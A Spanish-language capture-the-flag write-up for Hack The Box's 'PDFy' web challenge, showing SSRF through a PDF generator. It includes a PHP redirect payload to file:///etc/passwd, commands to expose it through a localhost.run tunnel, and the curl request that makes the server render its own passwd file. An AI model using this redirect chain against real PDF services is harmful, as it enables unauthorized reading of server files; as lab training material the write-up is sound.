---
title: "PDFy"
description: "Writeup de PDFy - Hack The Box - Web 200pts. Servicio Go que genera PDFs desde URLs; SSRF via redirección PHP a file:// URI permite leer /etc/passwd del servidor; la flag aparece como campo GECOS de un usuario en el passwd."
sidebar:
  badge:
    text: Web
    variant: note
tags:
  - htb
  - web
  - ssrf
  - file-read
  - pdf
  - go
  - php-redirect
  - localhost-run
  - lfi
---

# PDFy

> 🎯 Plataforma: Hack The Box
> 📂 Categoría: Web
> 🏆 Puntos: 200
> 👤 Autor: warrior866

---

## Descripción

PDFy es un servicio escrito en Go que acepta una URL y genera un PDF de su contenido (probablemente usando una librería como `wkhtmltopdf` o similar headless browser). El servicio tiene una validación de URL, pero no contempla que el servidor que generó el PDF puede seguir redirecciones HTTP hacia URIs `file://`, lo que permite leer archivos locales del servidor a través del PDF generado.

---

## Reconocimiento

La aplicación expone un formulario/endpoint que recibe una URL:

```bash
curl -s -X POST "$HOST/generate" \
  -d 'url=https://example.com'
```

Se recibe un PDF con el contenido de la página. La validación básica comprueba que la URL sea `http://` o `https://`, pero no contempla redirecciones.

---

## Estrategia: SSRF via redirección PHP

Si el generador de PDFs sigue redirecciones HTTP (como hace wkhtmltopdf por defecto), podemos alojar un fichero PHP que redirija a `file:///etc/passwd`:

```php
<?php
header('Location: file:////etc/passwd');
die();
```

Para que el servidor de PDFy acceda a nuestra URL, podemos usar un túnel público. Con `localhost.run`:

```bash
# En un directorio con el redirect.php
php -S 0.0.0.0:8080 &
ssh -R 80:localhost:8080 nokey@localhost.run
```

Esto genera una URL pública tipo `https://xxxx.localhost.run/redirect.php`.

---

## Generar el PDF con SSRF

Enviar la URL pública al servicio:

```bash
curl -s -X POST "$HOST/generate" \
  -d 'url=https://xxxx.localhost.run/redirect.php' \
  --output flag.pdf
```

El servicio de PDFy:
1. Descarga `redirect.php`.
2. Recibe `302 Location: file:////etc/passwd`.
3. Sigue la redirección y lee `/etc/passwd` localmente.
4. Genera un PDF con el contenido del archivo del servidor.

---

## Extraer la flag del PDF

```bash
pdftotext flag.pdf -
```

El contenido de `/etc/passwd` aparece en el PDF. La flag está en el campo GECOS de uno de los usuarios:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
ctf:x:1000:1000:HTB{FLAG}:/home/ctf:/bin/bash
```

El campo GECOS (cuarto campo de `/etc/passwd`) contiene la flag en el usuario `ctf`.

---

## Cadena de Ataque

```text
1. Identificar servicio de generación de PDFs que sigue redirecciones
       ↓
2. Crear redirect.php: header('Location: file:////etc/passwd')
       ↓
3. Exponer via túnel público (localhost.run, ngrok, etc.)
       ↓
4. Enviar URL pública al endpoint de PDFy
       ↓
5. PDFy sigue la redirección 302 → lee /etc/passwd del servidor
       ↓
6. PDF generado contiene el fichero local
       ↓
7. pdftotext → flag en campo GECOS del /etc/passwd
```

---

## Lecciones Aprendidas

- **wkhtmltopdf y redirecciones a file://**: esta es una vulnerabilidad conocida de wkhtmltopdf. Versiones antiguas siguen redirecciones a cualquier esquema URI incluyendo `file://`. La solución es actualizar a versiones modernas que deshabilitan este comportamiento, o filtrar las redirecciones en la aplicación.
- **SSRF via redirección**: muchas validaciones de URL solo comprueban el valor inicial de la URL. Si el servidor hace peticiones HTTP y sigue redirecciones, un endpoint que redirija a recursos internos puede eludir la validación.
- **Campos GECOS como storage de datos**: usar el campo GECOS de `/etc/passwd` para almacenar datos sensibles (como una flag) es inusual pero ilustra que cualquier parte del sistema puede contener información relevante.
- **localhost.run / ngrok para SSRF**: cuando la vulnerabilidad requiere que el servidor víctima contacte a nuestra máquina, usar túneles públicos para exponer servicios locales es la técnica estándar.

---

## Referencias

- [wkhtmltopdf SSRF](https://github.com/advisories/GHSA-5w9f-7crg-8j9x)
- [HackTricks — PDF generation injection](https://book.hacktricks.xyz/pentesting-web/server-side-xss-dynamic-pdf)
- [localhost.run — túnel SSH gratuito](https://localhost.run/)
